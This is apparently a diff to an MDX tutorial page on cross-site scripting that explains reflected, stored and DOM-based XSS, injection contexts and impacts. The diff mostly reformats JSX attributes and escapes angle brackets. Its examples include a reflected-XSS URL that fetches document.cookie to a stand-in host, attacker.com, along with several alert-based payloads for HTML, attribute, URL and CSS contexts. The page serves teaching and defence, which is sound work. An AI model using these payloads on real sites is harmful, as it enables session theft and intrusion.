@@ -11,13 +11,13 @@ Cross-Site Scripting (XSS) attacks are a type of injection vulnerability where m
 
 ## Types of XSS Attacks
 
-<Tabs defaultValue="reflected" className="pt-5 pb-1">
+<Tabs defaultValue={"reflected"} className={"pt-5 pb-1"}>
   <TabsList>
-    <TabsTrigger value="reflected">Reflected XSS</TabsTrigger>
-    <TabsTrigger value="stored">Stored XSS</TabsTrigger>
-    <TabsTrigger value="dom">DOM-based XSS</TabsTrigger>
+    <TabsTrigger value={"reflected"}>Reflected XSS</TabsTrigger>
+    <TabsTrigger value={"stored"}>Stored XSS</TabsTrigger>
+    <TabsTrigger value={"dom"}>DOM-based XSS</TabsTrigger>
   </TabsList>
-  <TabsContent value="reflected">
+  <TabsContent value={"reflected"}>
     ### Reflected XSS
     
     Reflected XSS occurs when malicious script is reflected off a web server, such as in search results, error messages, or any other response that includes some or all of the input sent to the server as part of the request. Reflected XSS is non-persistent and typically requires a victim to click on a specially crafted link.
@@ -29,10 +29,10 @@ Cross-Site Scripting (XSS) attacks are a type of injection vulnerability where m
     4. The victim's browser executes the script
     
     ```
-    https://vulnerable-site.com/search?query=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+    https://vulnerable-site.com/search?query=\<script\>fetch('https://attacker.com/steal?cookie='+document.cookie)\</script\>
     ```
   </TabsContent>
-  <TabsContent value="stored">
+  <TabsContent value={"stored"}>
     ### Stored XSS
     
     Stored XSS (also known as persistent XSS) occurs when malicious script is stored on the target server, such as in a database, message forum, comment field, or visitor log. The victim's browser will execute the script when it retrieves the stored data from the server.
@@ -48,7 +48,7 @@ Cross-Site Scripting (XSS) attacks are a type of injection vulnerability where m
     - Product reviews
     - Forum posts
   </TabsContent>
-  <TabsContent value="dom">
+  <TabsContent value={"dom"}>
     ### DOM-based XSS
     
     DOM-based XSS occurs when the vulnerability exists in client-side code rather than server-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.
@@ -64,12 +64,12 @@ Cross-Site Scripting (XSS) attacks are a type of injection vulnerability where m
     document.getElementById('greeting').innerHTML = 'Hello, ' + username;
     
     // Attack URL
-    // https://vulnerable-site.com/page?user=<img src=x onerror=alert(1)>
+    // https://vulnerable-site.com/page?user=\<img src="x" onerror="alert(1)"\>
     ```
   </TabsContent>
 </Tabs>
 
-<Callout type="info" title="Key Distinction">
+<Callout type={"info"} title={"Key Distinction"}>
   The main difference between the three types of XSS is where the payload is stored and how it's delivered to the victim. Reflected XSS requires user interaction with a malicious link, stored XSS affects anyone who views the compromised page, and DOM-based XSS executes through client-side JavaScript manipulation.
 </Callout>
 
@@ -80,7 +80,7 @@ XSS attacks can be delivered through various vectors:
 - **HTML Context**: Injecting script tags or event handlers
   ```html
   <script>alert('XSS')</script>
-  <body onload="alert('XSS')">
+  \<body onload="alert('XSS')"\>
   ```
 
 - **JavaScript Context**: Breaking out of existing JavaScript
@@ -90,17 +90,17 @@ XSS attacks can be delivered through various vectors:
 
 - **Attribute Context**: Escaping from HTML attributes
   ```html
-  " onmouseover="alert('XSS')
+  " onmouseover="alert('XSS')"
   ```
 
 - **URL Context**: Exploiting javascript: protocol
   ```html
-  <a href="javascript:alert('XSS')">Click me</a>
+  \<a href="javascript:alert('XSS')"\>Click me\</a\>
   ```
 
 - **CSS Context**: Exploiting expression() in older IE browsers
   ```css
-  <style>body {background-image:url("javascript:alert('XSS')")}</style>
+  \<style\>body {background-image:url("javascript:alert('XSS')")\}\</style\>
   ```
 
 ## Execution Contexts
@@ -127,7 +127,7 @@ When user input is placed within HTML attributes, attackers need to escape the a
 
 **Example:**
 ```html
-<input type="text" value="[INJECTION POINT]">
+\<input type="text" value={"[INJECTION POINT]"}\>
 ```
 
 **Payload:**
@@ -158,7 +158,7 @@ When user input is placed in URL parameters or as part of a URL, attackers can u
 
 **Example:**
 ```html
-<a href="[INJECTION POINT]">Click here</a>
+\<a href="[INJECTION POINT]"\>Click here\</a\>
 ```
 
 **Payload:**
@@ -178,7 +178,7 @@ XSS vulnerabilities can lead to several serious security issues:
 - **Network Scanning**: Using the victim's browser to scan internal networks
 - **Crypto Mining**: Running cryptocurrency miners in the victim's browser
 
-<Callout type="warning" title="Same-Origin Policy">
+<Callout type={"warning"} title={"Same-Origin Policy"}>
   XSS attacks are particularly dangerous because they bypass the Same-Origin Policy (SOP). Since the malicious script executes in the context of the vulnerable website, it has access to that site's cookies, session tokens, and other sensitive information.
 </Callout>
 
